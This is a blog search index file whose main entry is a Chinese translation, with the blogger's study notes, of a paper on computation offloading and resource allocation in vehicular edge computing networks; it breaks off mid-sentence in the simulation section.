<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>简历问题准备</title>
    <link href="/2024/03/07/%E7%AE%80%E5%8E%86%E9%97%AE%E9%A2%98%E5%87%86%E5%A4%87/"/>
    <url>/2024/03/07/%E7%AE%80%E5%8E%86%E9%97%AE%E9%A2%98%E5%87%86%E5%A4%87/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="648067094153f82d77a96f8ac2673280fb4ee7c886faeb7e8ec598492246720b"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Who am I?</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>复试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>复试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Joint computation offloading and resource allocation in vehicular edge computing networks</title>
    <link href="/2024/02/28/%E7%BF%BB%E8%AF%91/"/>
    <url>/2024/02/28/%E7%BF%BB%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<h2 id="车辆边缘计算网络中的联合计算卸载和资源分配">车辆边缘计算网络中的联合计算卸载和资源分配</h2><p>Joint computation offloading and resource allocation in vehicular edge<br>computing networks</p><p>关键词： 车辆边缘计算 任务卸载 匹配理论 拉格朗日方法 分布式算法</p><h2 id="摘要">摘要</h2><p>​车辆边缘计算（VEC）是一种很有前途的技术，通过将任务卸载到配备边缘计算服务器或邻近车辆的路边单元（RSU）来适应计算密集型和延迟敏感的任务。然而，边缘计算服务器有限的计算资源和车辆的移动性使得卸载策略设计非常具有挑战性。</p><p>​在此背景下，通过考虑车辆移动性带来的潜在传输增益，我们在VEC网络中提出了一种高效的计算卸载和资源分配方案具有两种卸载模式，即车辆到车辆（V2V）和车辆到RSU（ V2R）。我们通过将车辆的卸载延迟、能源消耗和费用与差异化定价策略以及传输增益结合起来，为车辆用户定义了一个新的成本函数。制定优化问题以在延迟和计算能力限制下最小化所有任务车辆的平均成本。<strong>通过将问题解耦为卸载模式选择和资源分配两个子问题，提出了分布式迭代算法。提出了基于匹配理论和基于拉格朗日的算法来分别解决这两个子问题。仿真结果表明，与三种基准方案相比，该算法复杂度较低，系统性能显着提高。</strong></p><h2 id="1-介绍">1.介绍</h2><p>车联网的出现彻底改变了计算时代，让车辆变得更加智能，为自动驾驶、车载虚拟现实、实时交通监控等计算密集型、时延敏感的应用提供更好的服务与控制[1–3]。然而，车辆有限的计算资源已成为满足智能车辆性能需求的主要瓶颈。车载云计算（VCC）是一种通过将计算任务迁移到远程服务器来应对这一挑战的有效技术，但长距离传输引起的延迟波动降低了卸载效率[4]。为此，车辆边缘计算（VEC）成为一种有前途的技术[5-7]，通过将任务卸载到 VEC 服务器来减轻车辆繁重的计算负担。</p><p>任务卸载是 VEC 网络中的一个关键问题。一般来说，车辆生成的计算任务可以卸载到附近配备在路边单元（RSU）中的 VEC 服务器 [8-11]。通常，考虑二元卸载决策问题，其中每个车辆独立地确定是在本地执行任务还是将任务卸载到位于路边的VEC服务器。部分卸载是某些工作中的一种选择，其中输入数据可以动态分为两部分，分别用于本地计算和边缘计算。此外，一些服务车辆可能在一段时间内没有计算任务，因此它们可以通过车对车（V2V）方式出租计算资源来提供计算卸载服务，以换取一些收入[12-15]。 V2V卸载充分利用了部分车辆的闲置计算资源，大大提高了VEC网络的资源利用效率。</p><p>然而，随着车辆用户的服务需求增加，有限的边缘服务器资源可能无法同时满足多辆车的需求。此外，车辆的高速移动使得网络拓扑不断变化，可能严重损害通信链路的质量，给卸载策略设计带来严峻的挑战[16]。因此，制定更灵活的联合卸载策略以提高卸载效率非常重要。</p><p>为了有效利用车辆和网络边缘的计算资源，设计了涉及V2V和车辆到RSU（V2R）通信模式的各种任务卸载方案，以满足服务质量（QoS）要求[17-20]。然而，现有的研究大多考虑单向车道，忽略了车辆移动的方向性。相比之下，考虑双向双车道场景更为实用。当任务车辆与其选择的VEC服务器之间的距离缩短时，可以实现传输增益，因为数据传输速率随着通信距离变短而增加。据我们所知，现有的工作尚未很好地考虑任务卸载过程中的传输增益。在本文中，我们重点研究能量有限的车辆（例如电动汽车或车载用户设备）的卸载策略，特别是电池容量有限的车辆（例如智能手机和可穿戴设备），其密集计算应用程序不需要不仅有严格的延迟约束，而且还需要大量的计算资源。此外，从绿色通信的角度来看，还需要一种低能耗的卸载方案。因此，应该设计一种有效的任务卸载方案，不仅可以减少任务处理延迟，还可以节省完成卸载任务的能耗。然而，任务卸载并不总能保证低能耗和低延迟，因为卸载数据会增加传输能耗和传输延迟。因此，综合考虑能耗和延迟，设计有效的卸载策略以满足任务车辆的服务质量要求非常重要。受上述事实的启发，我们提出了一种混合任务卸载方案，车辆可以通过选择 V2R 或 V2V 卸载模式自动将任务卸载到 RSU 服务器或服务车辆。考虑到车辆的移动性，通过选择合适的卸载模式并购买一些合理的卸载资源，可以获得更高的服务质量。以最小化所有任务车辆的平均成本为目标，我们联合优化卸载模式选择和计算资源分配。这项工作的<strong>主要贡献</strong>总结如下：</p><p><strong>1）我们提出了一种有效的模式选择协议，其中车辆可以在多车辆和多服务器网络中为能量有限的车辆或车载用户设备自主选择V2V或V2R卸载模式。</strong></p><p><strong>2）我们考虑车辆的移动性，并定义双向双车道场景中的传输增益，其中传输增益来自于所选服务器与任务车辆之间距离的缩短。此外，RSU服务器和服务车辆采用差异化定价策略，通过向任务车辆出租计算资源来获得收入。</strong></p><p><strong>3）我们通过结合任务车辆的卸载延迟、能源消耗、从RSU服务器或服务车辆购买计算资源的费用以及传输增益，设计了一种新颖的车辆成本指标。我们通过联合优化卸载模式选择和计算资源分配，在允许的延迟和计算能力约束下制定平均成本最小化问题。</strong></p><p><strong>4）基于匹配理论和拉格朗日对偶理论，我们提出了一种分布式迭代算法来解决原始优化问题，将其分为卸载模式选择子问题和资源分配子问题。仿真结果表明，所提出的算法在复杂度和成本方面大大优于基准方案。</strong></p><h2 id="2-相关工作">2.相关工作</h2><p>负载任务作为VEC网络中的一个重要问题，目前受到了广泛的研究。加载策略的计算一般可以分为二元加载[8,21]和部分加载[22]。</p><ul><li>对于二进制卸载，每辆车可以独立决定是在本地计算任务还是将任务卸载到VEC服务器。例如，Nguyen 等人。通过应用二元卸载方案改善车辆服务并减少能源消耗[8]。</li><li>对于部分卸载，输入数据被分为两部分，分别用于本地计算和边缘计算。戴等人。提出了联合负载平衡和部分卸载问题以最大化系统效用[22]。参考文献 1 中提出了一种仅依靠 V2V 通信的加载方案的任务。 [18]通过充分利用聚集车辆的闲置资源来执行任务。</li></ul><p>在上述工作中，车辆通常将其任务卸载到与 RSU 位于同一位置的VEC 服务器。当多辆车辆将任务加载到同一个VEC服务器时，由于VEC服务器的计算能力有限，很难满足车辆用户的延迟QoS要求。如果车辆将任务加载到远程云服务器上，长距离传输将带来沉重的开销。幸运的是，一些具有更强大计算能力的车辆可以充当服务器，承担多车辆和多服务器网络中从相邻车辆加载的任务。例如，张等人。研究了协作加载模式，其中计算资源有限的任务车辆可以将任务加载到提供计算服务的RSU 服务器或服务车辆 [17]。顾等人。使车辆能够将任务卸载给 VEC服务器和具有过多计算资源的车辆 [19]。然而，上述工作没有考虑车辆双向移动性带来的潜在性能增益。**考虑到可用的计算资源和车辆的移动性，我们通过联合考虑 V2R 和 V2V 加载模式以及双向交通中的潜在传输增益，提出了更高效的加载方案。**在这种情况下，任务车辆可以将其任务卸载到 RSU 或附近服务车辆上配备的 VEC 服务器。对于VEC网络中的加载任务，大多数现有工作旨在最小化延迟、能量消耗或费用[9,22-25]。在最大限度地减少延迟方面，Zhang 等人。提出了一种基于软件定义网络（SDN）的负载均衡任务加载方案，以最小化计算任务的处理延迟[23]。然而，更多的文献将延迟和能量消耗一起考虑。李等人。通过构建分层装载模型，共同考虑车辆的延误和成本，以优化装载比例并降低系统消耗[24]。杨等人。共同考虑加载决策、加载时间和计算资源，以最小化通信和计算成本[25]。张等人。联合优化多辆车的卸载比例和上行/计算/下行比特分配，以最小化车辆的总能耗[9]。在上述工作中，仅采用统一定价策略对车辆费用进行建模，即服务器对购买其计算资源的车辆收取相同的单价。在实际应用中，车辆的任务往往不同，车辆与服务器之间的距离也不同。差别定价方案可以获得更大的收入，这使得服务器可以对距离较近的车辆收取更高的价格，从而避免多辆车同时将任务卸载到同一服务器的情况。与现有工作不同的是，我们的目标是通过综合考虑卸载延迟、能源消耗和差别定价费用以及传输增益来最小化所有任务车辆的平均成本。</p><h2 id="3-系统模型">3. 系统模型</h2><h3 id="3-1车辆边缘网络模型">3.1车辆边缘网络模型</h3><p>我们考虑一个具有 M 个 RSU 和 N 个车辆的双向 VEC 网络双车道如图 1 所示，其中 RSU 位于路边。每个 RSU 都配备了一个计算资源有限的 VEC 服务器。</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/4.png" alt="4"></p><p>我们假设每辆车在装载和计算过程中以恒定速度移动。</p><p>d i,m(t) 和 d i,j (t) 表示任务车 i 之间的时变距离；</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/5.png" alt="5"></p><blockquote><p>这个是计算i和j之间距离的公式</p></blockquote><p>其中，h 是 RSU 的高度。</p><p>我们考虑信号传播中的大尺度路径损耗和小尺度瑞利衰落效应。由于信道是正交的，相邻车辆之间不存在相互干扰。上行链路传输从 TV i 到 RSU m 的任务率可表示为 r i,m (t) 并由下式给出</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/1.png" alt="1"></p><blockquote><p>δ0为参考距离处大尺度路径损失引起的信道功率增益</p><p>H i,m表示 TV i 和 RSU m 之间小尺度瑞利衰落引起的信道增益</p><p>κ是路径损耗指数</p><p>P是任务车发射功率</p><p>σ2为额外噪声的功率</p><p>B为信道带宽（B*log应该是）</p></blockquote><p>类似地，从 TV i 到 SV j 的上行链路传输速率可以表示为 r i,j(t) 并由下式给出</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/2.png" alt="2"></p><p>定义x i,m 和m作为从 TV i 到 RSU 服务器 m的卸载决策。有如下约束</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/3.png" alt="3"></p><p>所有TV（任务车）都需要根据自己的业务需求选择合适的加载模式。卸载方式的选择可以直接影响服务器的卸载时延、能耗和费用。接下来我们详细分析以下两种加载模式。</p><h3 id="3-2-卸载模型">3.2.卸载模型</h3><h4 id="3-2-1-V2R卸载模式">3.2.1. V2R卸载模式</h4><p>当TV i决定将其任务卸载到RSU m时，TV i的任务加载延迟可以分为两部分：</p><ul><li>卸载任务的上行传输时间</li><li>卸载任务的计算时间关联的 RSU服务器</li></ul><p>将t up i;m 表示为将任务从TV i 卸载到RSU 服务器m 的无线传输延迟，</p><p>将t exe i;m 表示为计算时间。</p><p>给定 TV i 和 RSU 服务器 m 。r i,m 之间的上行传输速率和车辆 i</p><p>R i 的任务大小，传输时间t up i;m 可以根据以下方程计算。</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/7-1709029412731.png" alt="7"></p><p>其中 f R i;m 是 RSU 服务器 m 分配给 TV i 的计算资源。由于许多应用的计算输出数据的大小远小于计算输入数据的大小，并且下载数据速率非常高，因此下行链路过程的传输延迟和能量消耗可以忽略不计[26]。因此，V2R 模式的卸载延迟由下式给出</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/8.png" alt="8"></p><p>类似地，当TV i向RSU服务器m卸载任务时，TV i完成任务的总能耗包括TV i的传输能耗和RSU服务器m的计算能耗。完成电视 i 的任务的总能量成本用 E i,m 表示，可以计算为</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/9.png" alt="9"></p><p>其中 γ m 是 RSU 服务器 m 的开关电容常数。卸载过程中TV需要购买计算来自 RSU 服务器的资源。我们将μ i,m 表示为价格单位TV i 从 RSU 服务器 m 购买的计算资源。 RSU 服务器 m 收取的TV i 的卸载费用用 e i,m 表示，并由下式给出</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/10.png" alt="10"></p><h4 id="3-2-2-V2V卸载模式">3.2.2. V2V卸载模式</h4><p>当TV i向SV服务器j卸载任务时，TV i的任务加载时延也可以分为两部分：</p><ul><li>向SV服务器j卸载任务的上行传输时间</li><li>SV 服务器 j 的计算时间</li></ul><p>将t up i;j 表示为将任务从TV i 卸载到SV j 的无线传输时间成本</p><p>将t exe i;j 表示为SV 服务器j 处的计算时间。</p><p>给定 r i,j 和Ri ，可以通过求解以下方程获得传输时间 t up i;j</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/6.png" alt="6"></p><p>其中 f S i;j 是分配给 TV i 的 SV j 的计算资源。因此，V2V模式的卸载延迟由下式给出</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/11.png" alt="11"></p><p>当TV i将任务卸载给SV j时，TV i加载完成任务的能量还包括传输能量和计算能量。 TV i 卸载任务的传输能量成本可以计算为</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/12.png" alt="12"></p><p>其中 γ j 是 SV j 的开关电容常数。我们将 Delta i,j 表示为SV j 收取的 TV i 计算资源的单价。由于RSU的接入服务是由一些运营商提供的，并且V2V通信总是由移动车辆自组织[13]，因此可以合理地假设V2V加载模式场外计算资源的价格单位远小于V2R加载模式</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/13.png" alt="13"></p><p>非统一定价机制由VEC服务器（即RSU服务器或SV服务器）应用。这意味着VEC服务器可以向电视收取不同的计算资源单价。这样可以鼓励每台TV选择单价较低的服务器来执行加载任务，以减少购买计算资源的费用。</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/17.png" alt="17"></p><h4 id="3-2-3-传输增益">3.2.3.传输增益</h4><p>为了更好地研究传输增益对成本的影响，我们将其视为平均成本的单独部分。当TV加载其当任务分配给逐渐靠近电视的 SV 或 RSU 服务器时，上行链路传输速率将随着电视与其目标服务器之间距离的缩短而增加。存在三种情况：</p><ul><li>TV 及其选择的 SV 在不同车道上行驶。当TV和选定的 SV 靠近时，它们的距离会变短。</li><li>电视及其选择的 SV 在同一车道上行驶。如果TV/SV以较高的速度追赶SV/TV，则TV与SV之间的距离会变短，即快车追慢车。</li><li>当TV选择其行驶方向上的前向RSU服务器时，TV与RSU服务器之间的距离也变短。</li></ul><p>在上述情况下，瞬时传输速率可能远高于全局平均速率，同一时间内可以传输更多的任务。因此，传输增益被定义为以瞬时速率传输的比特数与以平均速率传输的比特数之间的差。我们将 V2R 和 V2V 加载模式下产生的传输增益分别表示为 g i,m 和 g i,j ，分别表示为</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/14.png" alt="14"></p><p>其中ri;m和ri;j分别表示V2R和V2V加载模式下上行传输的平均速率，即</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/15.png" alt="15"></p><p>电视倾向于选择距离逐渐缩短的目标VEC服务器，因为缩短的距离可以提高瞬时传输速率和传输增益。需要注意的是，当电视遇到关联的VEC服务器后，它们之间的距离会逐渐增大。在这种情况下，如果任务没有完全卸载，并且瞬时传输速率低于平均传输速率，则累积的传输增益将逐渐被抵消。</p><h4 id="3-2-4-成本函数">3.2.4.成本函数</h4><p>由于VEC服务器计算资源的限制，当多辆车辆选择同一个VEC服务器来卸载其任务时，卸载策略可能效率较低并导致过载。因此，每辆车应选择合适的卸载模式并购买合适的计算资源，以降低系统成本。我们综合考虑卸载时延和能耗、服务器费用以及传输增益，构建了综合成本函数。电视 i 的成本为</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/16.png" alt="16"></p><p>其中，ωl和ωe分别表示卸载延迟和卸载的权重能量，分别。 Ti 是完成 TV i 已卸载任务的延迟。 E i 是电视 i 完成卸载任务的总能耗。 e i 是完成 TV i 的卸载任务的费用。它们可以表达如下</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/18.png" alt="18"></p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/19.png" alt="19"></p><h2 id="4-问题表述">4. 问题表述</h2><p>我们的目标是通过联合优化卸载关联和计算资源分配来最小化所有电视的总成本。成本最小化问题可以表示为</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/20.png" alt="20"></p><p>约束C 1 保证任务处理延迟不能超过最大允许延迟T max。</p><p>约束C 2 和C 3 确保分配给所有TV的总计算资源不超过RSU服务器或SV的总计算能力。</p><p>约束 C 4 、C5 和 C 6 确保每辆车仅将其任务加载给一个 RSU 或 SV。</p><p>约束 C 7 确保与同一 SV 关联的 TV 数量不能超过给定阈值 Q。</p><p>解决上述优化问题 P 1 的主要难点是整数变量 x i,m 1/4 {0, 1}和 y i,j 1/4 {0, 1} 以及连续变量 f R i;m 和 f S i;j 的相互影响，这使得优化问题 P 1 成为混合整数非线性规划问题，通常是非凸的并且难以在多项式时间内求解[27]。为了解决这个问题，我们将原问题分解为两个子问题，即模式选择子问题和资源分配子问题，然后提出一种低复杂度的分布式迭代算法。</p><h2 id="5-建议的解决方案">5. 建议的解决方案</h2><p>本节应用匹配理论求解模式选择子问题，应用拉格朗日对偶方法求解资源分配子问题。</p><h3 id="5-1-模式选择子问题的求解">5.1.模式选择子问题的求解</h3><p>当给定资源分配矩阵F R 和F S 时，P 1 可以变换为</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/21.png" alt="21"></p><p>在 P 2 中，所有变量 x i,m 、y i,j 都是二元变量，而目标函数相对于 x i,m 和 y i,j 是非线性的。这也是一个整数非线性规划问题。</p><p>为了最大限度地降低网络中所有TV的平均成本，那些对计算、通信和延迟要求较高的电视应匹配适当的服务器。匹配理论是研究两组主体之间互利关系形成的一种低复杂度的有用技术[19]。每个代理都有自己的偏好，并使用取决于一些可测量参数的效用函数对相反集合中的代理进行排名。电视根据基于匹配理论生成的偏好列表来做出卸载模式选择的决策，以最小化其成本[28]。此外，匹配决策是由代理本身根据本地收集的信息交互式地做出的。因此，基于匹配理论的协议不需要任何集中协调器，并且可以提高可扩展性。受上述观察的启发，我们提出了一种匹配算法，通过利用电视和 SV 之间的一对一匹配以及 RSU 服务器和电视之间的一对多匹配来查找电视和 VEC 服务器之间的匹配关系。负载模式选择匹配的定义如定义1所示。</p><p>定义1.（卸载模式选择匹配）</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/22.png" alt="22"></p><p>此外，还利用一对一匹配和一对多匹配来解决加载问题的计算。具体来说，电视和SV之间采用一对一匹配，其中一台TV只能将其任务卸载给一台SV，而一台SV只能为一台TV服务。此外，我们在RSU服务器和电视之间应用一对多匹配，其中一台RSU服务器可以为多台TV提供服务。为了解决基于匹配理论的优化问题P 2 ，我们首先需要分别设计TV、RSU服务器和SV的偏好函数和偏好列表。</p><h4 id="5-1-1-TV偏好">5.1.1.TV偏好</h4><p>为了执行匹配方法，每台TV都需要建立其偏好列表。为了满足QoS 要求，电视更喜欢与可以提供更短延迟、更低能耗和更少费用的RSU 或 SV 关联。由此，我们将卸载时延、能耗、服务器费用、传输增益之和的倒数定义为电视i的偏好函数φT i，得到偏好列表TV i 的 L Ti 按函数值降序排列。 TV i 对 RSU 或 SV 的偏好函数为</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/23.png" alt="23"></p><h4 id="5-1-2-RSU-或-SV-的偏好">5.1.2. RSU 或 SV 的偏好</h4><p>为了获得更高的收入，RSU和SV更愿意接受能够带来更高收入的用户的请求。因此，我们将RSU m 和SV j 的收益作为它们的偏好函数ÏRm 和ÏS j ，并根据函数值的递减顺序确定偏好列表L R m 和LS j 。RSU 服务器 m 和 SV j 对电视的偏好函数如下</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/25.png" alt="25"></p><p>匹配以迭代方式实现。仍然不匹配的 TV i 将向其最优选的 RSU 服务器和 L T i 中的 SV 发送匹配请求。如果RSU服务器m或SV j仅接收到一个请求，则将构造匹配。如果RSU服务器m或SV j 接收到多个请求，则RSU服务器m和SV j 将反转选择以根据偏好列表L R m 和LS j 构建匹配。已建立匹配关系的 RSU 服务器和 SV 将从所有尚未选择的电视的偏好列表中删除。当所有电视都建立了匹配关系并且没有被任何配对阻挡时，匹配过程将稳定并结束。阻塞对和稳定匹配的定义在下面的定义2和3中给出。</p><blockquote><p>Definition 2. (blocking pair). TV i and RSU server m or SV j form a blocking pair if both the TV and server prefer the others than their currently matched results.</p></blockquote><p>如果 TV 和服务器都更喜欢其他结果而不是其当前匹配的结果，则 TV i 和 RSU 服务器 m 或 SV j 相互阻塞。</p><blockquote><p>Definition 3. (stable matching). A matching Φ is stable if it is not blocked by any pair.</p></blockquote><h4 id="5-1-3-迭代匹配">5.1.3.迭代匹配</h4><p>由于车辆的卸载决策相互影响，所以得到的匹配结果在开始时并不稳定。因此，为了获得稳定的匹配结果，我们采用迭代匹配</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/26.png" alt="26"></p><p>正如定义 4 中所示，迭代匹配为 TV i 提供了改变其合作伙伴的机会。然而，当且仅当迭代匹配得到服务器认可时，迭代匹配才是有效的，并且当迭代匹配能够提高其效用时，服务器才会认可迭代匹配。迭代匹配与传统匹配的区别主要在于匹配过程中更新偏好列表的方式。具体来说，根据参考文献中所示的匹配理论。 [28]，在传统的匹配算法中，偏好函数在匹配过程中保持不变，并且仅通过删除已经成功匹配的代理来更新偏好列表。对于迭代匹配，如参考文献所示。[30]，偏好函数可以在每轮匹配中更新，然后根据当前匹配结果和资源分配结果重建偏好列表。</p><p>现在，我们提出了一种基于匹配理论的模式选择算法来获得最佳匹配策略</p><p>Φ*详细信息如算法1所示。</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/24.png" alt="24"></p><h3 id="5-2-资源分配子问题的求解">5.2.资源分配子问题的求解</h3><p>当模式选择决策x和y确定后，P 1 可以转化为如下所示的资源分配子问题P 3</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/27.png" alt="27"></p><blockquote><p>定义 5. 假设 f (x)是两次可微的。那么 f（x）是凸的当且仅当 dom f 是凸的并且 f(x) 的 Hessian 矩阵对于所有 x ∈ dom f 都是正半定 (PSD)，即</p></blockquote><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/28.png" alt="28"></p><p>可以证明中的P 3是凸优化问题。</p><p>根据定义 5，U i 就变量 f R i;m 和 fS i;j 而言是凹的。另外，由于约束条件C 1 ～C3 也是线性且凸的，因此证明(30)中的P 3是凸优化问题。</p><p>仿真参数如下表所示</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/29.png" alt="29"></p><p>如果原问题是凸问题，则对偶函数的最优解等于其自身的最优解。为了获得低复杂度的等效最优解，采用拉格朗日方法来求解该问题。拉格朗日函数是</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/30.png" alt="30"></p><p>其中，α、β 和 α 是拉格朗日乘数的向量。这拉格朗日对偶函数由下式给出</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/31.png" alt="31"></p><p>根据Karush-Kuhn-Tucker（KKT）条件[31]，我们可以得到变量的表达式。我们取 L 对 f R i;m 和 fS i;j 的一阶导数，并令它们等于 0。</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/32.png" alt="32"></p><p>则可得到f R i;m 和f S 的最优解表达式可以根据附录A中给出的(34)~(43)计算。由于拉格朗日函数是可微的，因此拉格朗日乘子的梯度可以得到为</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/34.png" alt="34"></p><p>其中</p><p>Δαi，Δβk，Δρj&gt; 0 是梯度步长，t d 是拉格朗日乘子的迭代次数</p><p>拉格朗日方法的详细信息如算法 2 所示</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/37.png" alt="37"></p><blockquote></blockquote><h3 id="5-3-联合模式选择和资源分配优化解决方案">5.3.联合模式选择和资源分配优化解决方案</h3><p>为了求解P 1 ，我们提出了一种联合考虑模式选择和资源分配的分布式迭代算法，其总结在算法3中。P 1 可以以分布式方式求解。特别地，我们将 P 1 分解为模式选择和资源分配子问题。首先，基于给定的F R 和F S ，每辆车利用匹配理论获得其模式选择决策X和Y。然后，在得到的模式选择决策下，各车辆利用拉格朗日乘子法求得F R 和F S，重复上述过程直至收敛。整个算法由匹配过程和拉格朗日对偶过程组成。我们将外层循环的迭代次数设置为N 3 ，并将匹配循环和拉格朗日双循环的迭代次数分别设置为N 1 和N 2 。具体来说，在每次内循环迭代中，车辆根据拉格朗日乘数是否收敛的判断标准做出选择决策。当内循环收敛时，外循环开始。匹配过程的复杂性包括以下几个方面：</p><p>1）车辆建立偏好列表并发起匹配邀请复杂度为O（I*(J+M)）</p><p>2）VEC服务器发起匹配过程，复杂度为O(I+J+M)。因此，匹配过程的复杂度为O(N1(I*(J+M)+(I+J+M)))。拉格朗日过程的<strong>复杂度</strong>主要由<strong>资源分配</strong>和<strong>拉格朗日乘子迭代过程</strong>组成，因此其复杂度为O(N2(I+J+M+I *(J+M)))。因此，对于 N 3 次迭代，我们提出的分布式算法的计算复杂度可以表示为O(N3[(N1(I *(J+M)+(I+J+M)))+(N2(I+J+M+I *(J+M)))])</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/38.png" alt="38"></p><p>为了在实践中实现所提出的分布式算法，我们使用算法1来确定电视和目标服务器之间的匹配关系，然后使用算法2来确定资源分配。首先，每辆车广播其位置信息并计算车辆之间的距离以更新距离矩阵。由于信道是正交的，车辆之间不存在干扰，只存在高斯白噪声。因此，我们建立了电视和VEC服务器之间的传输速率矩阵。同时，每台电视根据偏好函数建立自己的偏好列表，并向列表中的第一个服务器发送匹配请求。当所有电视发送匹配请求后，如果服务器只收到一个匹配请求，则服务器将与发送他请求的电视形成匹配对。如果一台服务器收到来自多辆车的多个请求，它将选择能够最大化其收入的电视进行匹配。然后，我们使用算法2来确定如何分配资源。两种算法迭代直至收敛。</p><h2 id="6-绩效评估">6. 绩效评估</h2><h3 id="6-1-模拟设置">6.1.模拟设置</h3><p>我们考虑位于双向双车道的车辆网络长度500m。车辆随机分布在该区域。每个SV允许服务的车辆数量阈值是Q×1。表1总结了通信参数。我们考虑计算密集型任务，例如智能导航、道路安全相关交通、娱乐应用等。这些任务对计算资源和处理延迟有不同的要求。我们用 fR i 表示任务的特征； C i ;最大温度</p><p>g 分别描述任务数据大小、计算资源需求和截止时间约束。不失一般性，在模拟中，电视的计算任务根据其数据大小、计算资源要求和延迟约束的特点随机分配。具体来说，生成的任务大小在[100, 2000] KB范围内随机分布，计算资源需求在[0.5,10] GHz范围内，最大延迟约束在[0.5, 2.5] s范围内。我们将我们提出的加载方案与以下三个基准方案进行比较：</p><ol><li>Only V2R模式方案:在TVs上生成的任务全部卸载到最近的RSU服务器上。</li></ol><p>2）基于距离的选择方案：TV生成的任务可以卸载到RSU服务器或SV，并且仅根据距离选择目标服务器。</p><p>3）仅V2V模式方案：TV处生成的任务全部卸载到最近的SV。</p><h3 id="6-2-收敛性能">6.2.收敛性能</h3><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/33.png" alt="33"></p><p>这图是收敛表现：不同的迭代次数时任务车的平均开销</p><p>在图2中，所提出方案的收敛性能以网络中不同电视数量（分别为3、5、10和15）下所有电视的平均成本来说明。从图2中，我们可以看到所提出的方案收敛得很快。经过五次或六次迭代后，不同电视数量下所有电视的平均成本很快收敛，这也意味着所提出的算法具有相对较低的复杂度。另外，从图2可以看出，随着电视数量的增加，电视的平均成本也随之增加。原因是所有VEC服务器的计算资源都是有限的。</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/35.png" alt="35"></p><blockquote><p>可以看到改进算法比仅 V2V模式的开销是低一点的</p></blockquote><p>图 3 显示了电视的平均成本与TV数量的关系。为了完成评估，我们在模拟具有 10 个 SV 和 15 个 RSU 服务器的电视的平均成本时选择了不同数量的电视（即 5、10、15、20、25、30、35）。我们可以看到，电视数量越多，电视的平均成本就越高。这是因为，RSU服务器和SV的计算资源是有限的，当电视越多时，分配给每个关联电视的计算资源就越少。此外，我们提出的方案实现的电视平均成本是最低的，这意味着我们提出的方案大大优于现有方案。</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/36.png" alt="36"></p><blockquote><p>四种方案下SV数量的影响</p></blockquote><p>图 4 显示了电视的平均成本与 SV 数量的关系。我们使用 15 台电视和 10 个 RSU 服务器来模拟具有不同数量 SV（即 5、10、15、20、25、30、35）的电视的平均成本。我们可以看到，随着 SV 数量的增加，所有方案的性能都会提高，因为更多的 SV 为电视之间的加载任务提供了更好的机会。相反，SV 的数量对仅 V2R 模式方案的性能影响较小，其中任务全部卸载到 RSU 服务器。给定相同的 SV 集，我们提出的方案的性能比基准方案的性能要好得多。</p><p><img src="/2024/02/28/%E7%BF%BB%E8%AF%91/39.png" alt="39"></p><p>图 5 显示了计算 [200,1000] 范围内的每一位所需的 CPU 周期对 10 台电视、5 台电视的平均成本的影响SV 和 5 个 RSU 服务器。当计算每一位所需的 CPU 